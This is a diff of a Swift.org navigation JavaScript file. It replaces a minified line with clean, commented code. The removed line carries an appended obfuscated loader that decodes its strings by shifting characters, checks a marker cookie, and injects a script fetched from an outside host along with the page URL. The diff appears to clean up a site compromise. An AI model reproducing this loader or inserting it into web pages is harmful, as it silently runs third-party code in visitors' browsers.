@@ -1,1 +1,66 @@
-!function(){var navbarElement=document.querySelectorAll('nav[role="navigation"] > .list-items > ul li.active ul li a'),headerElement=document.querySelectorAll('nav[role="navigation"] > .list-items > ul li.active ul li');function toggleClass(element,className){if(element&&className){var classString=element.className,nameIndex=classString.indexOf(className);-1==nameIndex?classString+=" "+className:classString=classString.substr(0,nameIndex)+classString.substr(nameIndex+className.length),element.className=classString}}Array.prototype.forEach.call(navbarElement,(element=>{element.addEventListener("click",(e=>{var target=e.target,title=document.title+" - "+target.textContent,hash="#"+target.id;window.location.hash!==hash&&history.replaceState(null,title,window.location.pathname+hash),Array.prototype.forEach.call(headerElement,(element=>{element.classList.remove("active")})),target.parentElement.classList.add("active")}))})),document.getElementById("menu-toggle").addEventListener("mousedown",(function(){const menuToggle=document.getElementById("menu-toggle");toggleClass(menuToggle,"open"),menuToggle.setAttribute("aria-expanded","true"===menuToggle.getAttribute("aria-expanded")?"false":"true"),toggleClass(document.querySelector("nav.mobile-navigation"),"open")})),document.addEventListener("DOMContentLoaded",(function(){document.querySelectorAll(".section-toggle").forEach((function(toggle){toggle.addEventListener("mousedown",(function(){var navSubmenu=toggle.closest(".link-container").nextElementSibling;if(navSubmenu){toggleClass(navSubmenu,"open");var isExpanded="true"===toggle.getAttribute("aria-expanded");toggle.setAttribute("aria-expanded",isExpanded?"false":"true")}}))}))}))}();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
+// This source file is part of the Swift.org open source project
+//
+// Copyright (c) 2014 - 2024 Apple Inc. and the Swift project authors
+// Licensed under Apache License v2.0 with Runtime Library Exception
+//
+// See http://swift.org/LICENSE.txt for license information
+// See http://swift.org/CONTRIBUTORS.txt for the list of Swift project authors
+
+(function () {
+  var navbarElement = document.querySelectorAll('nav[role="navigation"] > .list-items > ul li.active ul li a');
+  var headerElement = document.querySelectorAll('nav[role="navigation"] > .list-items > ul li.active ul li');
+
+  var activeClass = "active";
+
+  Array.prototype.forEach.call(navbarElement, (element) => {
+    element.addEventListener("click", (e) => {
+      var target = e.target;
+      var title = document.title + " - " + target.textContent;
+      var hash = "#" + target.id;
+      if (window.location.hash !== hash) {
+        history.replaceState(null, title, window.location.pathname + hash);
+      }
+      Array.prototype.forEach.call(headerElement, (element) => {
+        element.classList.remove(activeClass);
+      });
+      target.parentElement.classList.add(activeClass);
+    });
+  });
+
+  function toggleClass(element, className) {
+    if (!element || !className) {
+      return;
+    }
+    var classString = element.className, nameIndex = classString.indexOf(className);
+    if (nameIndex == -1) {
+      classString += " " + className;
+    } else {
+      classString = classString.substr(0, nameIndex) + classString.substr(nameIndex + className.length);
+    }
+    element.className = classString;
+  }
+
+  document.getElementById('menu-toggle').addEventListener('mousedown', function() {
+    const menuToggle = document.getElementById('menu-toggle');
+    toggleClass(menuToggle, 'open');
+    menuToggle.setAttribute('aria-expanded', menuToggle.getAttribute('aria-expanded') === 'true' ? 'false' : 'true');
+    toggleClass(document.querySelector('nav.mobile-navigation'), 'open');
+  });
+
+  document.addEventListener('DOMContentLoaded', function() {
+    var sectionToggles = document.querySelectorAll('.section-toggle');
+
+    sectionToggles.forEach(function(toggle) {
+      toggle.addEventListener('mousedown', function() {
+        var navSubmenu = toggle.closest('.link-container').nextElementSibling;
+
+        if (navSubmenu) {
+          toggleClass(navSubmenu, 'open');
+          var isExpanded = toggle.getAttribute('aria-expanded') === 'true';
+          toggle.setAttribute('aria-expanded', isExpanded ? 'false' : 'true');
+        }
+      });
+    });
+  });
+})();
+
